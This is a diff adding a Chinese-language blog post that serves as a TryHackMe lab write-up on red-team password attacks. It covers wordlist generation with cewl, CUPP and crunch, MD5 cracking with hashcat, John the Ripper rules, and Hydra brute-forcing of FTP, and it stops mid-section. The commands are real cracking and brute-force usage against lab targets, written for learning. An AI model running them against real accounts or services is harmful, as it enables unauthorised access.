@@ -1,0 +1,746 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Red Team Password Attacks | Zhi的筆記部落格</title>
+  <meta name="author" content="Zhi">
+  
+  <meta name="description" content="紅隊密碼攻擊-tryhackme">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Red Team Password Attacks"/>
+  <meta property="og:site_name" content="Zhi的筆記部落格"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Zhi的筆記部落格" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Zhi的筆記部落格</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>歷程
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>分類
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>標籤
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>關於Zhi
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Red Team Password Attacks</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> 紅隊密碼攻擊-tryhackme
+		 </div> <!-- alert -->
+	  		
+
+	  <h1 id="密碼攻擊"><a href="#密碼攻擊" class="headerlink" title="密碼攻擊"></a>密碼攻擊</h1><h2 id="密碼攻擊技術"><a href="#密碼攻擊技術" class="headerlink" title="密碼攻擊技術"></a>密碼攻擊技術</h2><blockquote>
+<p>密碼破解是一種用於從加密或雜湊資料到明文資料發現密碼的技術。攻擊者可能會從受感染的電腦取得加密或雜湊的密碼，或透過網路傳輸資料來擷取它們。一旦獲得密碼，攻擊者就可以利用密碼攻擊技術，使用各種工具破解這些雜湊密碼。</p>
+</blockquote>
+<ul>
+<li>密碼猜測<blockquote>
+<p>密碼猜測是一種針對在線協定和服務的攻擊方法。它通常涉及到向網站或服務發送多次登入請求，每次請求嘗試不同的密碼組合。<br>耗時性：這種方法通常是耗時的，因為攻擊者需要反覆嘗試直到找到正確的密碼。<br>可檢測性：由於每次嘗試都需要發送新的請求，這種攻擊容易被系統偵測到。系統可以通過分析來自同一來源的頻繁登入嘗試來識別攻擊。<br>對策：為防止密碼猜測，許多系統會實施帳戶鎖定政策或延遲回應策略，當檢測到多次失敗的登入嘗試時暫時鎖定帳戶或增加回應時間。</p>
+</blockquote>
+</li>
+<li>密碼破解<blockquote>
+<p>密碼破解則是在本地或由攻擊者控制的系統上執行的一種技術。通常涉及到使用先進的計算技術和算法在沒有在線交互的情況下嘗試破解密碼。<br>資源密集：這種方法可能需要大量的計算資源，尤其是當使用如GPU加速的密碼破解軟件時。<br>離線執行：與密碼猜測不同，密碼破解通常在攻擊者的控制環境中離線進行，這意味著它不依賴於對目標系統的在線請求，減少了被偵測的風險。<br>使用場景：當攻擊者獲得了密碼的哈希值（例如通過數據泄漏或系統入侵）時，他們可能會使用密碼破解技術來嘗試恢復原始的明文密碼。。</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="密碼分析-1-預設、弱、洩漏、組合和用戶名單字列表"><a href="#密碼分析-1-預設、弱、洩漏、組合和用戶名單字列表" class="headerlink" title="密碼分析 1 -(預設、弱、洩漏、組合和用戶名單字列表)"></a>密碼分析 1 -(預設、弱、洩漏、組合和用戶名單字列表)</h2><h3 id="默認預設密碼"><a href="#默認預設密碼" class="headerlink" title="默認預設密碼"></a>默認預設密碼</h3><h4 id="參考網站"><a href="#參考網站" class="headerlink" title="參考網站"></a>參考網站</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://cirt.net/passwords">default-password-1</a></li>
+<li><a target="_blank" rel="noopener" href="https://default-password.info/">default-password-2</a></li>
+<li><a target="_blank" rel="noopener" href="https://datarecovery.com/rd/default-passwords/">default-password-3</a></li>
+</ul>
+<h3 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h3><h4 id="參考網站-1"><a href="#參考網站-1" class="headerlink" title="參考網站"></a>參考網站</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://wiki.skullsecurity.org/index.php?title=Passwords">各網站弱密碼</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">github-SecLists弱密碼</a></li>
+</ul>
+<h3 id="洩漏密碼"><a href="#洩漏密碼" class="headerlink" title="洩漏密碼"></a>洩漏密碼</h3><h4 id="參考網址"><a href="#參考網址" class="headerlink" title="參考網址"></a>參考網址</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases">github-SecLists洩漏密碼</a></li>
+</ul>
+<h3 id="整理密碼列表"><a href="#整理密碼列表" class="headerlink" title="整理密碼列表"></a>整理密碼列表</h3><h4 id="合併密碼列表"><a href="#合併密碼列表" class="headerlink" title="合併密碼列表"></a>合併密碼列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file1.txt file2.txt file3.txt &gt; combined_list.txt</span><br></pre></td></tr></table></figure>
+<h4 id="移除重複的密碼"><a href="#移除重複的密碼" class="headerlink" title="移除重複的密碼"></a>移除重複的密碼</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort combined_list.txt | uniq -u &gt; cleaned_combined_list.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>sort combined_list.txt：这个命令将 combined_list.txt 文件中的所有行进行排序。按字母或数字顺序对文件的行进行排序。排序是去除重复内容的预处理步骤，因为 uniq 命令需要在已排序的输入上运行才能正确地检测和删除重复行。<br>uniq -u：uniq 命令用于从输入中删除重复的连续行。-u 选项指令 uniq 只输出那些未重复的行，也就是说，它会删除所有出现多次的行，只保留独一无二的行。如果不使用 -u 选项，uniq 默认只是合并重复的连续行为一行，并不移除它们。</p>
+</blockquote>
+<h3 id="定製字典"><a href="#定製字典" class="headerlink" title="定製字典"></a>定製字典</h3><blockquote>
+<p>定制密码列表是提高找到有效凭证机会的最佳方式之一。我们可以从目标网站创建定制的密码列表。通常，一家公司的网站包含了关于公司及其员工的宝贵信息，包括电子邮件和员工姓名。此外，网站可能包含与公司所提供的产品和服务相关的特定关键词，这些关键词可能被员工用于其密码中！</p>
+</blockquote>
+<h4 id="工具-cewl"><a href="#工具-cewl" class="headerlink" title="工具:cewl"></a>工具:cewl</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w list.txt -d 5 -m 5 http://thm.labs</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>-w 选项将内容写入文件。在这种情况下，文件名为 list.txt。<br>-m 5 收集5个字符或更多的字符串（单词）<br>-d 5 是网页爬取&#x2F;蜘蛛（spidering）的深度级别（默认为2）<br><a target="_blank" rel="noopener" href="http://thm.labs/">http://thm.labs</a> 是将要使用的URL<br><img src="/photo/Red_Team_passwordarttack/1.jpg" alt="1"></p>
+</blockquote>
+<h3 id="用戶名字典"><a href="#用戶名字典" class="headerlink" title="用戶名字典"></a>用戶名字典</h3><h4 id="工具-username-generator下載網址"><a href="#工具-username-generator下載網址" class="headerlink" title="工具:username_generator下載網址"></a>工具:username_generator下載網址</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/shroudri/username_generator">username_generator</a></p>
+</blockquote>
+<h4 id="範例"><a href="#範例" class="headerlink" title="範例"></a>範例</h4><blockquote>
+<p>查看工具參數說明</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 username_generator.py -h</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>將要輸入的名字放入字典中</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;John Smith&quot; &gt; users.lst</span><br><span class="line">python3 username_generator.py -w users.lst</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/photo/Red_Team_passwordarttack/2.jpg" alt="2"></p>
+</blockquote>
+<h2 id="密碼分析-2-鍵空間技術和-CUPP"><a href="#密碼分析-2-鍵空間技術和-CUPP" class="headerlink" title="密碼分析 2 -(鍵空間技術和 CUPP)"></a>密碼分析 2 -(鍵空間技術和 CUPP)</h2><h3 id="鍵空间技術"><a href="#鍵空间技術" class="headerlink" title="鍵空间技術"></a>鍵空间技術</h3><h4 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h4><blockquote>
+<p>键空间技术是在密码破解中使用的一种方法，它涉及到生成所有可能的密码组合来覆盖特定的字符集。这种技术常用于创建词表或进行暴力破解，特别是当未知密码的确切构成时。使用键空间技术可以确保尝试了所有可能的组合，从而最大化破解密码的机会。<br>键空间技术的工作原理：<br>定义字符集：首先确定密码可能包含的字符，例如小写字母、大写字母、数字和特殊符号。<br>设置长度范围：确定密码的最小和最大长度。例如，可能知道密码至少有6个字符，最多有12个字符。<br>生成组合：使用所选字符集和长度范围生成所有可能的密码组合。</p>
+</blockquote>
+<h4 id="鍵空間技術優缺點"><a href="#鍵空間技術優缺點" class="headerlink" title="鍵空間技術優缺點"></a>鍵空間技術優缺點</h4><blockquote>
+<p>使用键空间技术的优点：<br>全面性：这种方法确保了尝试每一种可能的组合，不遗漏任何潜在的密码。<br>灵活性：可以根据已知信息调整字符集和长度，如排除不可能的字符或设置更具体的长度范围。<br>缺点：<br>资源消耗：生成大量组合需要大量计算资源，特别是当字符集大和密码长度长时。<br>时间消耗：尝试所有可能的组合可能需要非常长的时间，尤其是对于复杂的密码。</p>
+</blockquote>
+<h3 id="鍵空间技術應用-crunch"><a href="#鍵空间技術應用-crunch" class="headerlink" title="鍵空间技術應用(crunch)"></a>鍵空间技術應用(crunch)</h3><blockquote>
+<p>查看可使用參數</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch -h</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>基礎用法</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 8 8 0123456789abcdefABCDEF -o crunch.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>最小長度:8<br>最大長度:8<br>“0123456789abcdefABCDEF”為組成元素<br>-o crunch.txt:儲存到crunch.txt<br><img src="/photo/Red_Team_passwordarttack/3.jpg" alt="3"></p>
+</blockquote>
+<blockquote>
+<p>crunch 還允許我們使用 -t 選項指定字符集，以組合我們選擇的單詞</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 5 5 -t a@,:^</span><br></pre></td></tr></table></figure>
+<ul>
+<li>@  : 小寫字母</li>
+<li>,  : 大寫字母</li>
+<li>%  : 數字字符</li>
+<li>^  : 包括空格在內的特殊字符<br><img src="/photo/Red_Team_passwordarttack/4.jpg" alt="4"></li>
+</ul>
+<h3 id="CUPP"><a href="#CUPP" class="headerlink" title="CUPP"></a>CUPP</h3><h4 id="簡介-1"><a href="#簡介-1" class="headerlink" title="簡介"></a>簡介</h4><blockquote>
+<p>CUPP（Common User Passwords Profiler）是一款用 Python 編寫的自動化和互動式工具，用於創建自定義詞表。</p>
+</blockquote>
+<h4 id="網址"><a href="#網址" class="headerlink" title="網址"></a>網址</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/Mebus/cupp">CUPP</a></p>
+</blockquote>
+<h4 id="示範"><a href="#示範" class="headerlink" title="示範"></a>示範</h4><blockquote>
+<p>查詢參數</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -h</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>啟動對話模式<br>如果關於目標問題你沒有答案，按Enter鍵來跳過</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -i</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/photo/Red_Team_passwordarttack/5.jpg" alt="5"><br>1337&#x2F;leet模式，可以將字母 a, i, e, t, o, s, g, z 替換為數字。例如，將 a 替換為 4 或將 i 替換為 1。</p>
+</blockquote>
+<blockquote>
+<p>使用cupp預設詞表</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -l</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>選擇主題<br><img src="/photo/Red_Team_passwordarttack/6.jpg" alt="6"></p>
+</blockquote>
+<blockquote>
+<p>使用 -a 選項從 Alecto 數據庫提供默認的用戶名和密碼</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -a</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Alecto數據庫是CUPP一個包含眾多常見或預設使用者名稱和密碼的數據庫。<br><img src="/photo/Red_Team_passwordarttack/7.jpg" alt="7"></p>
+</blockquote>
+<h4 id="小試身手"><a href="#小試身手" class="headerlink" title="小試身手"></a>小試身手</h4><p><img src="/photo/Red_Team_passwordarttack/8.jpg" alt="8"></p>
+<h2 id="離線攻擊-字典和暴力破解"><a href="#離線攻擊-字典和暴力破解" class="headerlink" title="離線攻擊 -(字典和暴力破解)"></a>離線攻擊 -(字典和暴力破解)</h2><h3 id="字典攻擊"><a href="#字典攻擊" class="headerlink" title="字典攻擊"></a>字典攻擊</h3><h4 id="簡介-2"><a href="#簡介-2" class="headerlink" title="簡介"></a>簡介</h4><blockquote>
+<p>字典攻擊是一種通過使用常見的單詞或短語來猜測密碼的技術。字典攻擊完全依賴於事先收集好的字典，這些字典是之前生成或找到的。</p>
+</blockquote>
+<h3 id="示範-字典攻擊hash-identifier-hashcat"><a href="#示範-字典攻擊hash-identifier-hashcat" class="headerlink" title="示範(字典攻擊hash-identifier&amp;hashcat)"></a>示範(字典攻擊hash-identifier&amp;hashcat)</h3><blockquote>
+<p>假設我們獲得了以下哈希 f806fc5a2a0d5ba2471600758452799c，並希望通過字典攻擊來破解它。首先，我們至少需要知道以下信息：</p>
+<ul>
+<li>這是什麼類型的哈希？</li>
+<li>我們將使用什麼單詞列表？或者我們可以使用什麼類型的攻擊模式？</li>
+</ul>
+</blockquote>
+<h4 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h4><blockquote>
+<p>要識別哈希的類型，我們可以使用像 hashid 或 hash-identifier 這樣的工具。對於這個例子，hash-identifier 認為可能的哈希方法是 MD5。<br><img src="/photo/Red_Team_passwordarttack/9.jpg" alt="9"></p>
+</blockquote>
+<h4 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h4><blockquote>
+<p>hashcat是一個用於破解哈希值的強大工具，可以進行各種類型的攻擊，包括字典攻擊、暴力破解和組合攻擊等，破解哈希所需的時間將取決於你使用的硬件（CPU 和&#x2F;或 GPU）<br>查看有哪些CPU和GPU</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -I</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/photo/Red_Team_passwordarttack/10.jpg" alt="10"></p>
+</blockquote>
+<blockquote>
+<p>開始破解</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -d 1 -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>-d 1 選擇id 1的CPU&#x2F;GPU<br>-a 0 設置攻擊模式為字典攻擊。<br>-m 0 設置用於破解 MD5 哈希的哈希模式；對於其他類型的哈希，運行 hashcat -h 查看支持的哈希列表。<br>f806fc5a2a0d5ba2471600758452799c 這個選項可以是單個哈希，就像我們的例子一樣，也可以是包含一個哈希或多個哈希的文件。<br>&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 是我們攻擊所使用的字典文件。<br><img src="/photo/Red_Team_passwordarttack/11.jpg" alt="11"></p>
+</blockquote>
+<blockquote>
+<p>運行 –show顯示已有被破過的哈希值</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/photo/Red_Team_passwordarttack/12.jpg" alt="12"></p>
+</blockquote>
+<h3 id="暴力破解攻擊"><a href="#暴力破解攻擊" class="headerlink" title="暴力破解攻擊"></a>暴力破解攻擊</h3><h4 id="簡介-3"><a href="#簡介-3" class="headerlink" title="簡介"></a>簡介</h4><blockquote>
+<p>暴力破解是攻擊者常用的一種攻擊手段，用於未經授權地訪問個人帳戶。這種方法通過發送標準密碼組合來猜測受害者的密碼。字典攻擊與暴力破解攻擊的主要區別在於，字典攻擊使用包含所有可能密碼的詞表。相比之下，暴力破解攻擊旨在嘗試字符或字符的所有組合。</p>
+</blockquote>
+<h3 id="暴力破解攻擊-hashcat"><a href="#暴力破解攻擊-hashcat" class="headerlink" title="暴力破解攻擊(hashcat)"></a>暴力破解攻擊(hashcat)</h3><blockquote>
+<p>查看可使用的參數</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat --help</span><br></pre></td></tr></table></figure>
+<ul>
+<li>? | Charset</li>
+<li>l | abcdefghijklmnopqrstuvwxyz</li>
+<li>u | ABCDEFGHIJKLMNOPQRSTUVWXYZ</li>
+<li>d | 0123456789</li>
+<li>h | 0123456789abcdef</li>
+<li>H | 0123456789ABCDEF</li>
+<li>s |  !”#$%&amp;’()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_`{|}~</li>
+<li>a | ?l?u?d?s</li>
+<li>b | 0x00 - 0xff</li>
+</ul>
+<blockquote>
+<p>列出所選的組合</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 ?d?d?d?d --stdout</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-a 3 設定攻擊模式為暴力破解攻擊</li>
+<li>?d?d?d?d 從 0000 開始到 9999 結束的四位數字</li>
+<li>–stdout 將結果打印到終端</li>
+</ul>
+<h3 id="示範-暴力攻擊hashcat"><a href="#示範-暴力攻擊hashcat" class="headerlink" title="示範(暴力攻擊hashcat)"></a>示範(暴力攻擊hashcat)</h3><blockquote>
+<p>破解以下 MD5 哈希值：05A5CF06982BA7892ED2A6D38FE832D6，一個四位數的 PIN 碼。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -d 1 -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d</span><br></pre></td></tr></table></figure>
+<p><img src="/photo/Red_Team_passwordarttack/13.jpg" alt="13"></p>
+<h3 id="小試身手-1"><a href="#小試身手-1" class="headerlink" title="小試身手"></a>小試身手</h3><p><img src="/photo/Red_Team_passwordarttack/14.jpg" alt="14"></p>
+<h2 id="離線攻擊-基於規則的"><a href="#離線攻擊-基於規則的" class="headerlink" title="離線攻擊 -(基於規則的)"></a>離線攻擊 -(基於規則的)</h2><h3 id="簡介-4"><a href="#簡介-4" class="headerlink" title="簡介"></a>簡介</h3><blockquote>
+<p>基於規則的攻擊也被稱為混合攻擊。基於規則的攻擊假設攻擊者對密碼政策有所了解。規則被應用來在給定的密碼政策指南範圍內創建密碼，理論上應該只生成有效的密碼。使用現有的詞表在生成符合政策的密碼時可能很有用 — 例如，對密碼進行操作或「變形」，比如將 ‘password’ 變形為 ‘p@ssword’、’Pa$$word’、’Passw0rd’</p>
+</blockquote>
+<h3 id="John-the-ripper混合攻擊"><a href="#John-the-ripper混合攻擊" class="headerlink" title="John the ripper混合攻擊"></a>John the ripper混合攻擊</h3><blockquote>
+<p>通常，John the Ripper 有一個包含規則集的配置文件，這個文件可能位於 &#x2F;etc&#x2F;john&#x2F;john.conf 或 &#x2F;opt&#x2F;john&#x2F;john.conf。你可以讀取 &#x2F;etc&#x2F;john&#x2F;john.conf，並查找 List.Rules 來查看所有可用的規則</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/john/john.conf|grep &quot;List.Rules:&quot; | cut -d&quot;.&quot; -f3 | cut -d&quot;:&quot; -f2 | cut -d&quot;]&quot; -f1 | awk NF</span><br></pre></td></tr></table></figure>
+<p><img src="/photo/Red_Team_passwordarttack/15.jpg" alt="15"></p>
+<blockquote>
+<p>使用規則</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l</span><br></pre></td></tr></table></figure>
+<ul>
+<li>–wordlist&#x3D; 用來指定詞表或字典文件。</li>
+<li>–rules 用來指定要使用的規則或多個規則。</li>
+<li>–stdout 用來將輸出打印到終端。</li>
+<li>wc -l 用來計算 John 生成了多少行<blockquote>
+<p>原本179個，使用規則後增加到13318個<br><img src="/photo/Red_Team_passwordarttack/16.jpg" alt="16"></p>
+</blockquote>
+</li>
+</ul>
+<h4 id="KoreLogic"><a href="#KoreLogic" class="headerlink" title="KoreLogic"></a>KoreLogic</h4><blockquote>
+<p>KoreLogic 是一種用於密碼破解的規則集，它利用多種內置的和自定義的規則來創建複雜的密碼列表。這可以幫助測試和破解加密的密碼。</p>
+</blockquote>
+<h5 id="規則集內容網址"><a href="#規則集內容網址" class="headerlink" title="規則集內容網址"></a>規則集內容網址</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://contest-2010.korelogic.com/rules.html">KoreLogic</a></p>
+</blockquote>
+<h5 id="示範-1"><a href="#示範-1" class="headerlink" title="示範"></a>示範</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=single-password-list.txt --rules=KoreLogic --stdout</span><br></pre></td></tr></table></figure>
+<p><img src="/photo/Red_Team_passwordarttack/17.jpg" alt="17"></p>
+<h4 id="自定義規則"><a href="#自定義規則" class="headerlink" title="自定義規則"></a>自定義規則</h4><blockquote>
+<p>John the Ripper 提供了很多功能。例如，我們可以構建自己的規則，在 John 正在破解哈希時實時使用，或者使用該規則來構建自定義詞表！</p>
+</blockquote>
+<blockquote>
+<p>編輯john.conf，將自定義規則加入</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/john/john.conf</span><br></pre></td></tr></table></figure>
+<p>添加規則(例如):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[List.Rules:THM-Password-Attacks] </span><br><span class="line">Az&quot;[0-9]&quot; ^[!@#$]</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>[List.Rules:THM-Password-Attacks] 指定規則名稱為 THM-Password-Attacks。<br>Az 代表原始詞表&#x2F;字典中的一個單詞<br>“[0-9]” 在單詞末尾追加一個數字（從 0 到 9）。若要添加兩個數字，可以添加 “[0-9][0-9]”，依此類推。<br>^[!@#$] 在每個單詞的開始處添加一個特殊字符。^ 表示行&#x2F;單詞的開始。注意，將 ^ 改為 $ 將會在行&#x2F;單詞的結尾處追加特殊字符。</p>
+</blockquote>
+<blockquote>
+<p>John 命令中使用 –rules 選項來包含我們創建的規則名稱。我們還需要在終端顯示結果。我們可以通過使用 –stdout 來實現</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout </span><br></pre></td></tr></table></figure>
+<p><img src="/photo/Red_Team_passwordarttack/18.jpg" alt="18"></p>
+<h4 id="小試身手-2"><a href="#小試身手-2" class="headerlink" title="小試身手"></a>小試身手</h4><p><img src="/photo/Red_Team_passwordarttack/19.jpg" alt="19"></p>
+<ul>
+<li>John the Ripper 的規則語法中，^[!@] 用於表示在每個單詞的開始處添加指定的符號。</li>
+<li>AZ為單字</li>
+</ul>
+<h2 id="部署虛擬機"><a href="#部署虛擬機" class="headerlink" title="部署虛擬機"></a>部署虛擬機</h2><blockquote>
+<p>開啟受害虛擬機<br>在攻擊機上生成關於此機器的密碼，根據提示密碼是關於<a target="_blank" rel="noopener" href="https://clinic.thmredteam.com/">https://clinic.thmredteam.com/</a> 網頁上的內容</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>生成使用者字典</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -a</span><br><span class="line">cp alectodb-usernames.txt ~/alectodb-usernames.txt</span><br></pre></td></tr></table></figure>
+<h2 id="線上密碼攻擊"><a href="#線上密碼攻擊" class="headerlink" title="線上密碼攻擊"></a>線上密碼攻擊</h2><h3 id="Hydra破解FTP"><a href="#Hydra破解FTP" class="headerlink" title="Hydra破解FTP"></a>Hydra破解FTP</h3><h4 id="FTP簡介"><a href="#FTP簡介" class="headerlink" title="FTP簡介"></a>FTP簡介</h4><blockquote>
+<p>FTP（File Transfer Protocol，文件傳輸協議）是一種用於在網絡上的計算機之間傳輸文件的標準網絡協議。它允許用戶和伺服器之間進行文件共享、上傳和下載。</p>
+</blockquote>
+<blockquote>
+<p>FTP 的主要特點包括：</p>
+</blockquote>
+<ul>
+<li>用戶認證：FTP 通常需要用戶登入，使用用戶名和密碼進行認證，但也可以配置為允許匿名訪問。<blockquote>
+<p>兩種模式：</p>
+</blockquote>
+</li>
+<li>主動模式：服務器嘗試連接到客戶端指定的任意端口。</li>
+<li>被動模式：客戶端連接到服務器指定的端口，更適合客戶端位於防火牆後的情況。</li>
+</ul>
+<h4 id="hydra破解FTP語法"><a href="#hydra破解FTP語法" class="headerlink" title="hydra破解FTP語法"></a>hydra破解FTP語法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l ftp -P passlist.txt ftp://10.10.x.x</span><br></pre></td></tr></table></figure>
+<blockquote>
